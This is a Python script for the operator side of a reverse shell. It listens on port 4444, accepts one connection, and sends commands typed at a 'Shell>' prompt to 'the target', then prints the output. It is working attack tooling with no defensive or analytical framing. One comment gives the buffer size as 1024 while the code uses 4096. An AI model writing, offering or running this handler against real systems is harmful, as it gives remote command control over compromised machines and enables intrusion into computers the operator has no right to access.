import socket

def start_server(host='0.0.0.0', port=4444):
    # Create the socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Allow the port to be reused immediately after closing
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Bind and Listen
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Listening for incoming connections on port {port}...")

    # Accept the connection
    conn, addr = server.accept()
    print(f"[*] Connection established from {addr}")

    with conn:
        while True:
            # Get command from your keyboard
            cmd = input("Shell> ").strip()
            if not cmd: continue
            
            # Send command to the target
            conn.send(cmd.encode())
            
            if cmd.lower() == 'exit':
                break

            # Receive and print the result
            # 1024 is the buffer size; increase it if output is cut off
            result = conn.recv(4096).decode()
            print(result)

    server.close()

if __name__ == "__main__":
    start_server()
